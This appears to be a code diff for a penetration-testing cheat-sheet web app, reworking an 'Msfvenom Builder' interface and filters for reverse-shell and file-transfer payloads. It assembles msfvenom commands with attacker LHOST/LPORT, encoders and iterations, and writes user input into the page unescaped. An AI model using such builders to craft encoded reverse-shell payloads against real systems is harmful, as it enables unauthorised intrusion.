@@ -17,77 +17,61 @@ function populatePrimaryFilter() {
   });
 }
 
+function populateMsfvenomBuilder() {
+  const payloadDropdown = document.getElementById("payloadDropdownBuilder");
+  const encoderDropdown = document.getElementById("encoderDropdownBuilder");
+  const formatDropdown = document.getElementById("formatDropdownBuilder");
+
+  // Populate dropdowns from JSON
+  const payloads = allPayloads["Msfvenom Builder"]["Payloads"] || [];
+  const encoders = allPayloads["Msfvenom Builder"]["Encoder"] || [];
+  const formats = allPayloads["Msfvenom Builder"]["Format"] || [];
+
+  populateDropdown(payloadDropdown, payloads);
+  populateDropdown(encoderDropdown, encoders);
+  populateDropdown(formatDropdown, formats);
+}
+
+
 // Update Secondary Filter Options
 function updateSecondaryFilter() {
   const primaryFilter = document.getElementById("primaryFilter").value;
   const secondaryFilter = document.getElementById("secondaryFilter");
   const dynamicInputs = document.getElementById("dynamicInputs");
   const filenameInput = document.getElementById("filenameInput");
-
-  const payloadDropdown = document.getElementById("payloadDropdown");
-  const encoderDropdown = document.getElementById("encoderDropdown");
-  const iterationsInput = document.getElementById("iterationsInput");
-  const formatDropdown = document.getElementById("formatDropdown");
-  const outputInput = document.getElementById("outputInput");
-  const generateButton = document.getElementById("generateButton");
-
   secondaryFilter.innerHTML = "";
   dynamicInputs.style.display = "none";
   filenameInput.style.display = "none";
 
-  // Show Msfvenom Builder fields
   if (primaryFilter === "Msfvenom Builder") {
+    searchSection.style.display = "none"; // Hide existing fields
+    msfvenomBuilder.style.display = "block"; // Show Msfvenom Builder
+    populateMsfvenomBuilder(); // Populate builder dropdowns
+  } else {
+    searchSection.style.display = "block"; // Show existing fields
+    msfvenomBuilder.style.display = "none"; // Hide Msfvenom Builder
+  }
+
+  if (primaryFilter === "Reverse Shell") {
     dynamicInputs.style.display = "flex";
-    payloadDropdown.style.display = "inline-block";
-    encoderDropdown.style.display = "inline-block";
-    iterationsInput.style.display = "inline-block";
-    formatDropdown.style.display = "inline-block";
-    outputInput.style.display = "inline-block";
-    generateButton.style.display = "inline-block";
+  } else if (primaryFilter === "File Transfer") {
+    dynamicInputs.style.display = "flex";
+    filenameInput.style.display = "inline-block";
+  }
 
-    // Populate dropdowns
-    const payloads = allPayloads["Msfvenom Builder"]["Payloads"];
-    const encoders = allPayloads["Msfvenom Builder"]["Encoder"];
-
-    populateDropdown(payloadDropdown, payloads);
-    populateDropdown(encoderDropdown, encoders);
+  if (primaryFilter && allPayloads[primaryFilter]) {
+    Object.keys(allPayloads[primaryFilter]).forEach(subType => {
+      const option = document.createElement("option");
+      option.value = subType;
+      option.textContent = subType;
+      secondaryFilter.appendChild(option);
+    });
+    secondaryFilter.classList.remove("disabled");
+  } else {
+    secondaryFilter.innerHTML = '<option>No Options</option>';
+    secondaryFilter.classList.add("disabled");
   }
 } 
-
-// Populate dropdown with options
-function populateDropdown(dropdown, options) {
-  dropdown.innerHTML = '<option value="">Select Option</option>'; // Reset options
-  options.forEach(option => {
-    const optElement = document.createElement("option");
-    optElement.value = option;
-    optElement.textContent = option;
-    dropdown.appendChild(optElement);
-  });
-}
-
-function generateMsfvenomCommand() {
-  const lhost = document.getElementById("lhostInput").value.trim();
-  const lport = document.getElementById("lportInput").value.trim();
-  const payload = document.getElementById("payloadDropdown").value;
-  const encoder = document.getElementById("encoderDropdown").value;
-  const iterations = document.getElementById("iterationsInput").value.trim();
-  const format = document.getElementById("formatDropdown").value;
-  const output = document.getElementById("outputInput").value.trim();
-  
-  if (!lhost || !lport || !payload || !output) {
-    alert("LHOST, LPORT, Payload, and Output are required fields!");
-    return;
-  }
-
-  let command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -o ${output}`;
-  if (format) command += ` -f ${format}`;
-  if (encoder) command += ` -e ${encoder}`;
-  if (iterations) command += ` -i ${iterations}`;
-
-  alert(`Generated Command:\n\n${command}`);
-}
-
-
 
 // Function to fetch and load payloads from JSON file
 function fetchPayloads() {
@@ -99,6 +83,30 @@ function fetchPayloads() {
     })
     .catch(error => console.error("Error loading payloads:", error));
 }
+
+function generateMsfvenomCommand() {
+  const lhost = document.getElementById("lhostInputBuilder").value.trim();
+  const lport = document.getElementById("lportInputBuilder").value.trim();
+  const payload = document.getElementById("payloadDropdownBuilder").value;
+  const encoder = document.getElementById("encoderDropdownBuilder").value;
+  const iterations = document.getElementById("iterationsInputBuilder").value.trim();
+  const format = document.getElementById("formatDropdownBuilder").value;
+  const output = document.getElementById("outputInputBuilder").value.trim();
+  const commandContainer = document.getElementById("generatedCommandContainer");
+
+  if (!lhost || !lport || !payload || !output) {
+    alert("LHOST, LPORT, Payload, and Output are required fields!");
+    return;
+  }
+
+  let command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -o ${output}`;
+  if (format) command += ` -f ${format}`;
+  if (encoder) command += ` -e ${encoder}`;
+  if (iterations) command += ` -i ${iterations}`;
+
+  commandContainer.innerHTML = `<p>Generated Command:</p><code>${command}</code>`;
+}
+
 
 // Executes search based on filters and optional keyword
 function executeSearch() {
